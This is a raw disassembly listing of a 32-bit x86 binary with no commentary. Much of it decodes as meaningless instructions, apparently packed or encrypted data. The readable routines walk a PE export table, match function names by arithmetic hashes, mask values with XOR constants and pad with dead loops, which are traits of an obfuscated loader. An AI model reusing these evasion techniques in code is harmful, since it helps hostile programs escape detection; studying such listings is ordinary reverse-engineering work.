  40e4bf:	sbb    esp,0x7ee114d2
  40e4c5:	xchg   ebx,eax
  40e4c6:	pop    esp
  40e4c7:	out    0xb1,eax
  40e4c9:	inc    ebx
  40e4ca:	sbb    dl,BYTE PTR [esi]
  40e4cc:	pop    es
  40e4cd:	mov    al,0x7d
  40e4cf:	push   cs
  40e4d0:	ss jge 0x40e46b
  40e4d3:	xchg   ebx,eax
  40e4d4:	pop    esi
  40e4d5:	xor    al,0x9
  40e4d7:	inc    esi
  40e4d8:	adc    DWORD PTR [edi],0xffffffd7
  40e4db:	or     al,0x58
  40e4dd:	fisttp DWORD PTR [ecx+esi*4+0x49c8813d]
  40e4e4:	call   0xe37d:0x5eb3704c
  40e4eb:	out    dx,eax
  40e4ec:	pusha  
  40e4ed:	push   ds
  40e4ee:	mov    ecx,0x601b4036
  40e4f3:	int    0x3e
  40e4f5:	add    ah,dl
  40e4f7:	(bad)
  40e4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4fc:	or     al,0x89
  40e4fe:	inc    esp
  40e4ff:	cld    
  40e500:	cmp    BYTE PTR [ecx+0x5b32bfd8],bl
  40e506:	push   ebx
  40e507:	repnz push ss
  40e509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e50a:	dec    esp
  40e50b:	out    dx,eax
  40e50c:	sub    DWORD PTR [edx],ebp
  40e50e:	mov    ds,WORD PTR [esi]
  40e510:	mov    esp,esp
  40e512:	cmp    esi,DWORD PTR [ebx+0x28]
  40e515:	pop    ds
  40e516:	push   esi
  40e517:	push   ebp
  40e518:	ds jns 0x40e570
  40e51b:	push   edx
  40e51c:	stc    
  40e51d:	neg    ch
  40e51f:	loop   0x40e590
  40e521:	adc    eax,0xf43f667e
  40e526:	and    ah,BYTE PTR [edi]
  40e528:	lods   eax,DWORD PTR ds:[esi]
  40e529:	inc    edx
  40e52a:	xchg   DWORD PTR [edx],ebx
  40e52c:	inc    ebp
  40e52d:	cli    
  40e52e:	pop    edx
  40e52f:	es retf 0xc4af
  40e533:	cmp    ecx,DWORD PTR [edi-0x6d223da9]
  40e539:	cmp    BYTE PTR [eax+eax*8+0x46],cl
  40e53d:	jae    0x40e53e
  40e53f:	sub    bh,bh
  40e541:	repnz xchg ecx,eax
  40e543:	in     eax,dx
  40e544:	pop    ebx
  40e545:	call   0x8f2c:0x7fdc1c2a
  40e54c:	sbb    DWORD PTR [esi-0x4f50d365],ebp
  40e552:	adc    BYTE PTR [edi-0xd],bl
  40e555:	xlat   BYTE PTR ds:[ebx]
  40e556:	fcmovb st,st(6)
  40e558:	pop    esp
  40e559:	test   BYTE PTR [ebp+edx*8-0x7ef4907],al
  40e560:	aas    
  40e561:	call   0xb08e:0x68aa67ac
  40e568:	pop    ebx
  40e569:	out    dx,al
  40e56a:	adc    esi,ebp
  40e56c:	std    
  40e56d:	push   edi
  40e56e:	lahf   
  40e56f:	aas    
  40e570:	push   0x6cbd355
  40e575:	mov    ds:0x9477180,eax
  40e57a:	icebp  
  40e57b:	add    al,0x36
  40e57d:	xor    esp,0xffffffc5
  40e580:	repz pop eax
  40e582:	push   0xd5ccc866
  40e587:	push   esi
  40e588:	xchg   edx,eax
  40e589:	hlt    
  40e58a:	push   eax
  40e58b:	cli    
  40e58c:	test   BYTE PTR [edx],cl
  40e58e:	add    DWORD PTR [ebp+0x3b],edi
  40e591:	dec    DWORD PTR [ebx+0x95a620b]
  40e597:	mov    ds:0x525873ed,al
  40e59c:	fstp   DWORD PTR [eax]
  40e59e:	mov    ebp,0x186cf573
  40e5a3:	les    esp,FWORD PTR [ebp-0x1f1921e]
  40e5a9:	es ret 
  40e5ab:	pusha  
  40e5ac:	ins    BYTE PTR es:[edi],dx
  40e5ad:	je     0x40e60b
  40e5af:	mov    ds:0xee7cbb85,eax
  40e5b4:	retf   
  40e5b5:	jno    0x40e5bf
  40e5b7:	mov    cx,0x328e
  40e5bb:	mov    bl,BYTE PTR [ebp+0x72]
  40e5be:	pop    edi
  40e5bf:	jo     0x40e57c
  40e5c1:	adc    al,0xe8
  40e5c3:	xchg   edi,eax
  40e5c4:	and    eax,0x1bfc2f1
  40e5c9:	xchg   esp,eax
  40e5ca:	mov    al,0xe8
  40e5cc:	or     al,0xdf
  40e5ce:	into   
  40e5cf:	push   ecx
  40e5d0:	ror    DWORD PTR [ecx+0x7a],0x22
  40e5d4:	dec    esi
  40e5d5:	adc    ecx,DWORD PTR [edx*2-0x51111de9]
  40e5dc:	(bad)  
  40e5dd:	pop    esp
  40e5de:	bound  eax,QWORD PTR [ebx+0x44ca12bb]
  40e5e4:	adc    esp,DWORD PTR [ebp-0x4ebbe16a]
  40e5ea:	es stc 
  40e5ec:	test   al,0x5e
  40e5ee:	jle    0x40e5db
  40e5f0:	add    al,0x5b
  40e5f2:	mov    ds:0x3d5c6414,eax
  40e5f7:	pop    DWORD PTR [esi+0x25c397ca]
  40e5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5fe:	outs   dx,BYTE PTR ds:[esi]
  40e5ff:	cwde   
  40e600:	fistp  WORD PTR [edx-0x3b]
  40e603:	fmul   st,st(3)
  40e605:	jmp    0xd23f:0x9f64d6f7
  40e60c:	xchg   ebp,eax
  40e60d:	mov    al,0xdd
  40e60f:	fisttp DWORD PTR [edi+0x4d582705]
  40e615:	mov    DWORD PTR [edx],edx
  40e617:	icebp  
  40e618:	cmp    BYTE PTR [esi-0x23],ch
  40e61b:	mov    ebp,0xc12e1f24
  40e620:	cli    
  40e621:	pop    edx
  40e622:	scas   al,BYTE PTR es:[edi]
  40e623:	mov    edi,0xd268b2c0
  40e628:	adc    esp,DWORD PTR [esi]
  40e62a:	leave  
  40e62b:	and    eax,eax
  40e62d:	mov    gs,WORD PTR [ebp-0x21]
  40e630:	and    DWORD PTR [ebx+0x34d9eb90],ebx
  40e636:	push   esi
  40e637:	jle    0x40e5c8
  40e639:	int    0x97
  40e63b:	les    edx,FWORD PTR [edx+0xb969ca5]
  40e641:	sub    edi,esp
  40e643:	jbe    0x40e5e6
  40e645:	xor    BYTE PTR [ebx-0x16],dl
  40e648:	loopne 0x40e694
  40e64a:	or     eax,0x120b479b
  40e64f:	cmp    al,0x7a
  40e651:	jmp    0x1256:0x78f7456a
  40e658:	jb     0x40e64b
  40e65a:	pop    ebp
  40e65b:	in     al,dx
  40e65c:	jae    0x40e6a7
  40e65e:	and    BYTE PTR [ecx],bl
  40e660:	imul   ebp,DWORD PTR [esi+0x724e1c02],0xd6d23216
  40e66a:	lea    edi,[ecx+0x6b45cc1f]
  40e670:	fsubr  DWORD PTR ds:0x26e15154
  40e676:	ins    DWORD PTR es:[edi],dx
  40e677:	sub    BYTE PTR [ecx],bl
  40e679:	imul   edx,DWORD PTR [edi],0xffffffb9
  40e67c:	pop    edx
  40e67d:	sub    eax,DWORD PTR [esi-0x4]
  40e680:	aaa    
  40e681:	sbb    dl,bl
  40e683:	frstor [eax+0x32]
  40e686:	mov    edx,0xf2aa5e5
  40e68b:	push   edx
  40e68c:	xchg   esi,eax
  40e68d:	cld    
  40e68e:	mov    bl,BYTE PTR [edx+0x66]
  40e691:	push   esi
  40e692:	sahf   
  40e693:	test   BYTE PTR [edi+esi*8],0xe4
  40e697:	or     dl,BYTE PTR [eax+0x49]
  40e69a:	or     eax,0x30180516
  40e69f:	fs jge 0x40e629
  40e6a2:	js     0x40e69c
  40e6a4:	jnp    0x40e724
  40e6a6:	mov    eax,DWORD PTR [ebp+0x9a26e6c]
  40e6ac:	pop    esi
  40e6ad:	push   ds
  40e6ae:	pop    edi
  40e6af:	imul   edi,DWORD PTR [ebx-0x62],0xffffffd5
  40e6b3:	jbe    0x40e64e
  40e6b5:	pop    edx
  40e6b6:	leave  
  40e6b7:	xor    DWORD PTR [edx],ebx
  40e6b9:	sbb    DWORD PTR [eax+0x1fbc89b4],esi
  40e6bf:	iret   
  40e6c0:	xchg   ebx,eax
  40e6c1:	icebp  
  40e6c2:	scas   al,BYTE PTR es:[edi]
  40e6c3:	mov    DWORD PTR [eax+0x15ab20be],edx
  40e6c9:	pop    ecx
  40e6ca:	mov    BYTE PTR [eax-0x1983c6a7],bl
  40e6d0:	daa    
  40e6d1:	psubd  mm3,QWORD PTR [ebp+0x36]
  40e6d5:	loopne 0x40e72a
  40e6d7:	aam    0xbf
  40e6d9:	inc    edi
  40e6da:	and    BYTE PTR [edx-0x5ff1e045],ch
  40e6e0:	jne    0x40e755
  40e6e2:	pop    ds
  40e6e3:	mov    eax,ds:0xc7951d79
  40e6e8:	rcr    BYTE PTR ds:0x10af9d99,cl
  40e6ee:	mov    gs,WORD PTR [edi-0x4a]
  40e6f1:	mov    ch,0x4
  40e6f3:	mov    ds:0xd582793,al
  40e6f8:	int3   
  40e6f9:	mov    ebp,DWORD PTR [ebp+0x42]
  40e6fc:	cwde   
  40e6fd:	push   cs
  40e6fe:	pop    eax
  40e6ff:	bound  edi,QWORD PTR [eax]
  40e701:	icebp  
  40e702:	add    edi,DWORD PTR [edi-0x6857e061]
  40e708:	add    eax,0x93521712
  40e70d:	ss cs das 
  40e710:	pop    eax
  40e711:	fs jns 0x40e766
  40e714:	retf   
  40e715:	jo     0x40e74b
  40e717:	mov    ah,dh
  40e719:	inc    ebx
  40e71a:	jge    0x40e738
  40e71c:	mov    dl,0xac
  40e71e:	pop    edx
  40e71f:	add    eax,0xc5cd440e
  40e724:	add    dl,BYTE PTR [ebp-0x1e]
  40e727:	push   ds
  40e728:	aaa    
  40e729:	add    cl,BYTE PTR [edi-0x43]
  40e72c:	adc    al,0xd2
  40e72e:	dec    esp
  40e72f:	ret    0x4462
  40e732:	call   0xbc19:0xe40e97eb
  40e739:	sub    BYTE PTR [edi],ch
  40e73b:	fcomip st,st(6)
  40e73d:	daa    
  40e73e:	cmp    eax,0x6281bca2
  40e743:	inc    BYTE PTR [ecx+0x29]
  40e746:	fld    TBYTE PTR [eax+0x375924f7]
  40e74c:	and    BYTE PTR [eax],ah
  40e74e:	clc    
  40e74f:	xchg   edx,eax
  40e750:	dec    ecx
  40e751:	push   0x82a29836
  40e756:	jno    0x40e7d5
  40e758:	push   ebp
  40e759:	pop    eax
  40e75a:	xchg   edx,eax
  40e75b:	lahf   
  40e75c:	sub    al,0x32
  40e75e:	shl    DWORD PTR [eax+eax*2],0xd8
  40e762:	adc    BYTE PTR [eax+edi*2],dh
  40e765:	push   0x425b620b
  40e76a:	jp     0x40e786
  40e76c:	sar    ebp,1
  40e76e:	add    eax,0x62912b29
  40e773:	lea    dx,[ebp+edx*1-0x6d]
  40e778:	lods   al,BYTE PTR ds:[esi]
  40e779:	xor    DWORD PTR [ebx+0x5e],edx
  40e77c:	hlt    
  40e77d:	sub    DWORD PTR [edi],esp
  40e77f:	out    dx,al
  40e780:	fsub   QWORD PTR [ebx+0x23]
  40e783:	push   ds
  40e784:	mov    WORD PTR [bp+di+0xb],cs
  40e788:	pop    esi
  40e789:	clc    
  40e78a:	cmp    al,0x21
  40e78c:	ss or  cl,ch
  40e78f:	clc    
  40e790:	imul   BYTE PTR [esi]
  40e792:	mov    WORD PTR ds:0x56e2f675,fs
  40e798:	shr    BYTE PTR [ecx-0x7dcf9943],1
  40e79e:	fimul  DWORD PTR [ecx+0x0]
  40e7a1:	ss jmp 0x40e81e
  40e7a4:	xor    al,0xf5
  40e7a6:	jl     0x40e750
  40e7a8:	pop    esp
  40e7a9:	dec    edi
  40e7aa:	mov    ds:0xddcfba8d,eax
  40e7af:	inc    ebp
  40e7b0:	ret    
  40e7b1:	push   esp
  40e7b2:	(bad)  
  40e7b3:	hlt    
  40e7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b5:	add    ch,bl
  40e7b7:	mov    al,ds:0xb90786b4
  40e7bc:	addr16 sbb al,0x12
  40e7bf:	and    DWORD PTR [ecx-0x5e],0x3
  40e7c3:	imul   ebx,ecx,0x20
  40e7c6:	clc    
  40e7c7:	dec    ebp
  40e7c8:	xchg   esi,eax
  40e7c9:	ins    DWORD PTR es:[edi],dx
  40e7ca:	out    dx,eax
  40e7cb:	arpl   WORD PTR [ebx-0x56],cx
  40e7ce:	enter  0x8b60,0xd4
  40e7d2:	push   ebp
  40e7d3:	es mov ah,0x66
  40e7d6:	outs   dx,BYTE PTR ds:[esi]
  40e7d7:	imul   edi,DWORD PTR [ecx],0x38
  40e7da:	sub    eax,0x145abc34
  40e7df:	pusha  
  40e7e0:	adc    BYTE PTR [edi-0x163eaab0],0x3d
  40e7e7:	rcl    BYTE PTR [edi+0x67],1
  40e7ea:	pop    ebx
  40e7eb:	adc    ebp,DWORD PTR [edi-0x69]
  40e7ee:	pop    ebp
  40e7ef:	aaa    
  40e7f0:	adc    BYTE PTR [ebx+0x4],0x18
  40e7f4:	add    al,BYTE PTR [edx-0x116f5a9a]
  40e7fa:	hlt    
  40e7fb:	fbstp  TBYTE PTR [eiz*8-0x4e8932cf]
  40e802:	jp     0x40e85a
  40e804:	ret    
  40e805:	stos   BYTE PTR es:[edi],al
  40e806:	leave  
  40e807:	lahf   
  40e808:	or     DWORD PTR [esi-0x1],ecx
  40e80b:	outs   dx,DWORD PTR ds:[esi]
  40e80c:	xor    ebx,ebp
  40e80e:	pop    es
  40e80f:	or     eax,0xe7ce576a
  40e814:	xlat   BYTE PTR ds:[ebx]
  40e815:	arpl   WORD PTR [edx-0x1e097e0d],bx
  40e81b:	push   ds
  40e81c:	cmp    ebx,DWORD PTR [esi+0x119384bb]
  40e822:	xor    DWORD PTR [edi*4-0x69e4d8],ebx
  40e829:	mov    bl,0x90
  40e82b:	pop    esi
  40e82c:	ret    0x3d59
  40e82f:	aam    0xb3
  40e831:	jb     0x40e8b2
  40e833:	fmul   DWORD PTR [eax]
  40e835:	push   esp
  40e836:	cli    
  40e837:	add    eax,0xa2e53e1b
  40e83c:	push   esp
  40e83d:	fsub   QWORD PTR [ebx]
  40e83f:	sub    DWORD PTR [edi],ebp
  40e841:	dec    ebx
  40e842:	in     eax,0x8a
  40e844:	pop    ss
  40e845:	bound  ecx,QWORD PTR [ecx+0x2fdea7df]
  40e84b:	mov    bh,BYTE PTR [edx]
  40e84d:	int3   
  40e84e:	call   0x4f29:0x9852ed23
  40e855:	fnstcw WORD PTR [ebp+0x2e]
  40e858:	mov    dh,0x2
  40e85a:	fdivr  QWORD PTR [edx+0x5]
  40e85d:	jg     0x40e869
  40e85f:	pushf  
  40e860:	push   esi
  40e861:	and    al,0xe1
  40e863:	jl     0x40e89b
  40e865:	call   0x7590:0xc965be29
  40e86c:	sbb    al,0xa1
  40e86e:	loope  0x40e7fe
  40e870:	bound  ecx,QWORD PTR [ecx+0x58e83c3f]
  40e876:	adc    BYTE PTR [ebx],dl
  40e878:	das    
  40e879:	pop    esi
  40e87a:	mov    ah,0x60
  40e87c:	or     eax,DWORD PTR [edx+0x44]
  40e87f:	ret    
  40e880:	aam    0xba
  40e882:	mov    ecx,0x31005689
  40e887:	push   bp
  40e889:	dec    edx
  40e88a:	adc    eax,0x7a7a553e
  40e88f:	push   ebp
  40e890:	and    edx,eax
  40e892:	stos   DWORD PTR es:[edi],eax
  40e893:	xor    eax,0x408080da
  40e898:	or     BYTE PTR [ebp-0x6be76652],al
  40e89e:	cmp    ah,BYTE PTR [edi]
  40e8a0:	aam    0x3f
  40e8a2:	sub    ebx,DWORD PTR [ecx+0x1b68a62c]
  40e8a8:	repnz jecxz 0x40e88d
  40e8ab:	fs dec ebx
  40e8ad:	cmp    al,0x99
  40e8af:	and    BYTE PTR [ebx-0x22],bh
  40e8b2:	ss push edx
  40e8b4:	xchg   ecx,eax
  40e8b5:	shl    ch,1
  40e8b7:	(bad)  
  40e8b8:	popa   
  40e8b9:	outs   dx,BYTE PTR ds:[esi]
  40e8ba:	jecxz  0x40e8bd
  40e8bc:	pop    edx
  40e8bd:	jbe    0x40e8e8
  40e8bf:	ss or  al,0xba
  40e8c2:	and    esp,DWORD PTR [ebx-0x57]
  40e8c5:	inc    esi
  40e8c6:	(bad)  
  40e8c7:	or     eax,0x8c97a137
  40e8cc:	mov    ch,0xfa
  40e8ce:	cmp    BYTE PTR [ecx-0x58e22369],bl
  40e8d4:	mul    esi
  40e8d6:	mov    eax,ds:0xe7decd13
  40e8db:	int3   
  40e8dc:	test   eax,0xa9b7525e
  40e8e1:	sahf   
  40e8e2:	inc    ebp
  40e8e3:	cmp    DWORD PTR [ebx+0x1fdd32bc],ebx
  40e8e9:	sbb    BYTE PTR [esi-0x57b5aa00],al
  40e8ef:	mov    ebp,0x76b8e347
  40e8f4:	ror    dl,1
  40e8f6:	sti    
  40e8f7:	in     eax,0xd4
  40e8f9:	sub    DWORD PTR [edi-0x5939e577],0x21fb43ca
  40e903:	push   ecx
  40e904:	pop    eax
  40e905:	push   esi
  40e906:	(bad)
  40e909:	fucomip st,st(2)
  40e90b:	in     al,0x69
  40e90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e90e:	rep ins DWORD PTR es:[edi],dx
  40e910:	xor    al,0x94
  40e912:	(bad)  
  40e913:	xchg   edx,eax
  40e914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e915:	mov    edx,0x5168e40b
  40e91a:	fmul   DWORD PTR [ebx]
  40e91c:	and    eax,0x219c983d
  40e921:	jg     0x40e913
  40e923:	aaa    
  40e924:	sub    al,BYTE PTR [edx]
  40e926:	add    BYTE PTR [ecx-0x2f843f7b],0x2e
  40e92d:	pop    esi
  40e92e:	imul   ecx,DWORD PTR [ebp+0x2919cfd4],0x14
  40e935:	mov    ebx,0x62df0186
  40e93a:	aad    0x28
  40e93c:	dec    ecx
  40e93d:	clc    
  40e93e:	ror    BYTE PTR [edi+edx*8-0x15980898],cl
  40e945:	cs push 0xffffffad
  40e948:	jge    0x40e95c
  40e94a:	and    al,0x55
  40e94c:	inc    ebp
  40e94d:	dec    ebp
  40e94e:	hlt    
  40e94f:	mov    bl,0xc1
  40e951:	mov    ecx,0xf5d58e33
  40e956:	sub    cl,BYTE PTR [esi]
  40e958:	inc    ecx
  40e959:	inc    esp
  40e95a:	jne    0x40e8fd
  40e95c:	xchg   BYTE PTR [esi+0x12c29174],dh
  40e962:	repnz cmp BYTE PTR [esi],dl
  40e965:	mov    DWORD PTR [edi-0x62],edx
  40e968:	repz pop edx
  40e96a:	xchg   ebp,eax
  40e96b:	fidiv  DWORD PTR ds:0xe9950a1d
  40e971:	ins    DWORD PTR es:[edi],dx
  40e972:	push   es
  40e973:	jmp    0x66c8:0xa5b211
  40e97a:	mov    edi,0x3ff5d02d
  40e97f:	push   ss
  40e980:	and    esi,ebx
  40e982:	adc    eax,0xb2fd4d7b
  40e987:	adc    edi,DWORD PTR [ebx]
  40e989:	fcom   QWORD PTR [edx+0xa75011f]
  40e98f:	dec    esp
  40e990:	loop   0x40e9b0
  40e992:	and    cl,BYTE PTR [ebx-0x75]
  40e995:	jnp    0x40ea08
  40e997:	retf   
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	clc    
  40eced:	sahf   
  40ecee:	jmp    0x407c:0x7ccc7cbe
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	push   ecx
  40ecf9:	cmp    edi,ebp
  40ecfb:	push   esp
  40ecfc:	bound  esp,QWORD PTR [esi+0x13]
  40ecff:	xchg   esi,eax
  40ed00:	out    dx,al
  40ed01:	sti    
  40ed02:	mov    cl,0x1c
